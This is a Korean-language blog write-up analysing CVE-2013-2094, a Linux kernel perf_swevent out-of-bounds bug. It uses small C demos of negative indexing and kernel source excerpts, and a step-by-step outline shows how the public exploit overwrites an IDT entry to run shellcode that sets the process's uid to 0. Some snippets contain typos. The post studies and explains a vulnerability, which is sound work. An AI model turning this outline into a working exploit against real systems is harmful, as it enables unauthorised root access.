
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="CVE-2013-2094 kernel: perf_swevent_enabled array out-of-bound access
A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094) &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/3/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/18/cve-2013-2094-kernel-perf-swevent-enabled-array-out-of-bound-access/">CVE-2013-2094 Kernel: Perf_swevent_enabled Array Out-of-bound Access</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-18T19:41:53+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:41 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=962792#c16">CVE-2013-2094 kernel: perf_swevent_enabled array out-of-bound access</a></li>
<li><a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/">A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)</a></li>
<li><a href="https://github.com/realtalk/cve-2013-2094">github</a></li>
<li><a href="https://dl.packetstormsecurity.net/1403-exploits/perf_swevent_init.c">Brad Spengler</a></li>
<li><a href="http://phrack.org/issues/64/6.html#article">Phrack #64 file 6, Attacking the Core : Kernel Exploiting Notes</a></li>
<li><a href="http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html">Intel: Interrupt and Exception Overview</a></li>
</ul>


<h4>C basics</h4>

<p><code>-1</code> 로 indexing 이 되는 상황이 여기있다. <code>uint32</code> -> <code>int32</code> -> <code>int64</code> 로 거치면서 negative indexing 이 되는 상황.</p>

<figure class='code'><figcaption><span>increment</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span> <span class="p">};</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int32_t</span> <span class="n">index</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">index64</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
</span><span class='line'>    <span class="n">index64</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">b</span><span class="p">[</span><span class="n">index64</span><span class="p">]]);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp;b: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp; : %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="n">index64</span><span class="p">]);</span>
</span><span class='line'>    <span class="c1">//atomic_inc(&amp;b[index64]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">atomic_inc</span>
</span><span class='line'><span class="mi">0</span>
</span><span class='line'><span class="o">&amp;</span><span class="nl">b</span><span class="p">:</span> <span class="mh">0x7fff4f7407b4</span>
</span><span class='line'><span class="o">&amp;</span> <span class="o">:</span> <span class="mh">0x7fff4f7407b0</span>
</span></code></pre></td></tr></table></div></figure>


<p>원래 <code>&amp;b[0]</code> 이 kernel address 였으면 -1 indexing 정도는 마찬가지로 kernel address 가 된다. base - 4 * abs(index) 에 위치한 값이 increment 된다. kernel memory 를 increment 할 수 있는 primitive 를 가지게 된 셈이다.</p>

<figure class='code'><figcaption><span>decrement</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uindex64</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">index64</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">uindex64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;uindex64: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">uindex64</span><span class="p">);</span>
</span><span class='line'>    <span class="n">index64</span> <span class="o">=</span> <span class="n">uindex64</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="mh">0xffFFffFF81f360c0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp;b: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp; : %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="n">index64</span><span class="p">]);</span>
</span><span class='line'>    <span class="c1">//atomic_dec(&amp;b[index64]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">atomic_dec</span>
</span><span class='line'><span class="nl">uindex64</span><span class="p">:</span> <span class="mh">0xffffffff</span>
</span><span class='line'><span class="o">&amp;</span><span class="nl">b</span><span class="p">:</span> <span class="mh">0xffffffff81f360c0</span>
</span><span class='line'><span class="o">&amp;</span> <span class="o">:</span> <span class="mh">0x381f360bc</span>
</span></code></pre></td></tr></table></div></figure>


<p>kernel memory 였던 <code>0xffffffff81f360c0</code> 이 <code>+ 0xffffffff</code> overflow 해서 user-land 인 <code>0x381f360bc</code> 로 넘어가버렸다. <code>0x381f360bc</code> 를 알면 원래 <code>b</code> 를 알 수 있을까? 있다.</p>

<figure class='code'><figcaption><span>calc_orginal_base.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/perf_event.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;syscall.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffFFffFF81f360c0</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0x381f360bc</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">o</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">o</span> <span class="o">=</span> <span class="n">p</span> <span class="o">-</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffFFffFF</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">o</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">calc_original_base</span>
</span><span class='line'><span class="mh">0xffffffff81f360c0</span>
</span></code></pre></td></tr></table></div></figure>


<p>즉,</p>

<ol>
<li>user-land 에 메모리를 잡아놓고,</li>
<li>그 메모리를 0 으로 초기화한다음에,</li>
<li>atomic_dec() 를 <code>config == -1</code> 로 트리거한다음에,</li>
<li>메모리를 스캔해서 0 에서 바뀐 메모리 offset 을 알아내고,</li>
<li>그 메모리에서 0xffFFffFF 를 빼면 perf_swevent_enabled 의 주소를 얻게 되는 것이다.</li>
<li>이 주소를 기반으로 <code>asm sidt</code> 에서 얻은 IDT 주소를 인풋으로 계산해서, vulnerable 한 perf_swevent_init() 을 트리거시키는 것이다. perf_swevent_open() 을 통해서.</li>
<li>그러면 IDT 의 vector offset 주소의 상위 4 바이트 0xffFFffFF 가 atomic_inc() 되면서, 0x0 이 되고, interrupt 를 처리하는 vector 주소가 커널에서 user-land 로 바뀌게 된다.</li>
<li>그 주소에는 이미 NOP slide + shell code 가 들어가있어서,</li>
<li>인터럽트를 발생시키면 kernel priv. 로 shell code 가 수행된다.</li>
<li>shell code 는 current task 의 credential structure 를 찾아서, uid/gid 를 0 으로 바꾸고, int 0x4 관련 Interrupt descriptor 를 원복하는 일을 한다.</li>
<li>이제 <code>asm("int $0x4");</code> 로 인터럽트 수행. shell code 가 ring0 priv. 로 돈다.</li>
<li>정리하면 -1 에 대해서, destroy path 에서 user-land 메모리를 dec() 하고, 같은 -1 에 대해서, init/open path 에서 kernel 메모리를 inc() 한다.</li>
</ol>


<p>어쨌건 kernel memory 일부 영역을 increment 할 수 있는 primitive 를 얻게 되었다.</p>

<p><code>0xffffffff........</code> 인 어드레스의 top 32-bits 에 inc() 를 걸면 0 으로 변한다. 커널주소를 user-land 주소로 바꾸는 primitive 를 얻은 셈이다.</p>

<h4>signed/unsigned</h4>

<p><code>perf_swevent_init</code> 는 <code>kernel/events/core.c</code> 에 defined.</p>

<figure class='code'><figcaption><span>calc_orginal_base.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="n">init</span> <span class="nf">perf_swevent_init</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">config</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">type</span> <span class="o">!=</span> <span class="n">PERF_TYPE_SOFTWARE</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">event_id</span> <span class="o">&gt;=</span> <span class="n">PERF_COUNT_SW_MAX</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>    <span class="n">static_key_slow_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">event_id</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>event_id 는 <code>int event_id = event-&gt;attr.config</code> 로 <code>signed</code> 변수.</p>

<p><code>event-&gt;attr.config</code> 의 31st bit 이 세팅이되면 event_id 는 negative value 가 된다.</p>

<p>negative value 가 되면 <code>if (event_id &gt;= PERF_COUNT_SW_MAX)</code> 를 통과하게 된다.</p>

<p>통과하면 <code>static_key_slow_inc(&amp;perf_swevent_enabled[event_id])</code> 에 들어가는데.</p>

<p>static_key_slow_int() 는 <code>kernel/jump_label.c</code> 에 등록되어있다.</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">static_key_slow_inc</span><span class="p">(</span><span class="k">struct</span> <span class="n">static_key</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_inc_not_zero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">enabled</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">jump_label_lock</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">enabled</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="p">...</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">enabled</span><span class="p">);</span>
</span><span class='line'>    <span class="n">jump_label_unlock</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 <code>perf_swevent_enabled</code> 는</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">static_key</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">atomic_t</span> <span class="n">enabled</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">jump_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">;</span>
</span><span class='line'><span class="cp">#ifdef CONFIG_MODULES</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">static_key_mod</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">static_key</span> <span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">PEF_COUNT_SW_MAX</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>즉 <code>atomic_t</code> 에 대한 <code>atomic_inc()</code> 가 들어가는 상황. 근데 index 가 negative 면, 엉뚱한 메모리에 대해서 atomic_inc() 가 들어갈 수 있음.</p>

<p>근데, 설명을 보면 <code>atomic_t perf_swevent_enabled[PERF_COUNT_SW_MAX]</code> 라고 되어있음. 커널 버전에 따라 다른가 의심됨.</p>

<p>하여간 설명이 맞다고 하면, <code>perf_swevent_enabled[]</code> 는 integer array 이고. negative indexing 이 되는 상황을 가정해보면.</p>

<p><code>event_id</code> 가 64-bit 로 sign extended 되고. <code>event_id</code> 가 -1 라고 하면,</p>

<p><code>0xffffffff</code> -> <code>0xffffffffffffffff</code> 가 된다.</p>

<p>인덱싱되는 어드레스는 <code>event_id * sizeof(int)</code> + &amp;perf_swevent_enabled 가 된다.</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">boot</span><span class="o">/</span><span class="n">System</span><span class="p">.</span><span class="n">map</span><span class="o">-</span><span class="mf">2.6.32</span><span class="o">-</span><span class="mf">358.</span><span class="n">el6</span><span class="p">.</span><span class="n">x86_64</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">perf_swevent_enabled</span>
</span><span class='line'><span class="n">ffffffff81f360c0</span> <span class="n">B</span> <span class="n">perf_swevent_enabled</span>
</span></code></pre></td></tr></table></div></figure>


<p>하면 <code>perf_swevent_enabled</code> 의 주소가 나오는데.</p>

<p><code>event-&gt;attr.config == 0xffffffff</code> 라고 하면,</p>

<p><code>0xffFFffFFffFFffFF * 4 + 0xffffffff81f360c0 == 0xffFFffFF81f360bc</code></p>

<p>이 되고.</p>

<p><code>event-&gt;attr.config == 0xfffffffe</code> 라고 하면,</p>

<p><code>0xffFFffFFffFFffFe * 4 + 0xffffffff81f360c0 == 0xffFFffFF81f360b8</code></p>

<p>이 된다.</p>

<p>커널 메모리를 inc 하게 되는 셈인데.</p>

<p>이제 <code>sw_perf_event_destroy()</code> 를 보면.</p>

<p><code>u64 event_id = event-&gt;attr.config;</code> 로 되어있다.</p>

<p>이 코드는 destroy 쪽 code path 이다. perf_swevent_open() 으로 만들어진 fd 가 close() 될 때, 수행되는 코드이다.</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">5112</span> <span class="k">static</span> <span class="kt">void</span> <span class="n">sw_perf_event_destroy</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">)</span>
</span><span class='line'><span class="mi">5113</span> <span class="p">{</span>
</span><span class='line'><span class="mi">5114</span>         <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">config</span><span class="p">;</span>
</span><span class='line'><span class="mi">5115</span>
</span><span class='line'><span class="mi">5116</span>         <span class="nf">WARN_ON</span><span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">);</span>
</span><span class='line'><span class="mi">5117</span>
</span><span class='line'><span class="mi">5118</span>         <span class="nf">static_key_slow_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">event_id</span><span class="p">]);</span>
</span><span class='line'><span class="mi">5119</span>         <span class="nf">swevent_hlist_put</span><span class="p">(</span><span class="n">event</span><span class="p">);</span>
</span><span class='line'><span class="mi">5120</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이 경우, <code>event-&gt;attr.config == 0xffFFffFF</code> 라고 하면,</p>

<p><code>(u64)0xffFFffFF * 4 + 0xffFFffFF81f360C0 == 0x0000000381F360bc</code></p>

<p>이번에는 user space 를 inc() 들어간다.</p>

<p>이제 exploit code 로 가보자.</p>

<h4>mmap &amp; MAP_FIXED</h4>

<p>MAP_FIXED 로 하면, a specified address 에 메모리를 alloc 해달라고 요청할 수 있다.</p>

<h4>syscall wrapper</h4>

<p><code>/usr/include/asm/unistd_64.h</code> 에서 symbolic constant 를 얻을 수 있다.</p>

<p><code>#define __NR_getpid    39</code> 같은.</p>

<h4>Interrupt Descriptor table and sidt</h4>

<p>register <code>IDTR</code> 은 다음과 같은 structure 를 track 하고 있는데.</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 64bit IDTR structure</span>
</span><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idtr</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>reg <code>IDTR</code> 을 조작할때는 <code>sidt</code> &amp; <code>lidt</code> instruction 을 사용. <code>lidt</code> 는 kernel 에서 호출. <code>sidt</code> 는 user-land 에서도 가능.</p>

<h4>Linux kernel performance monitoring interface</h4>

<p><code>perf_event_open</code> -> fd 를 얻을 수 있다. <code>perf_event_open</code> 은 결국 <code>perf_swevent_init</code> 를 호출.</p>

<h4>Buggy increment in the kernel</h4>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// first arg to perf_event_open</span>
</span><span class='line'><span class="k">struct</span> <span class="n">perf_event_attr</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">__u32</span>       <span class="n">type</span><span class="p">;</span>
</span><span class='line'>    <span class="n">__u32</span>       <span class="n">size</span><span class="p">;</span>
</span><span class='line'>    <span class="n">__u32</span>       <span class="n">config</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Buggy decrement in the kernel</h4>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">sw_perf_event_destroy</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">config</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>    <span class="n">atomic_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">event_id</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>event_id 는 64 bit 가 되니까 엄청나게 큰 레인지를 addressing 할 수 있다. perf_swevent_enabled 가 integer array 라면 multiplied by 4 가 되어서.</p>

<h4>mmap()</h4>

<ul>
<li>mmap() / MAP_FIXED 로 초기 메모리를 alloc 한다.</li>
</ul>


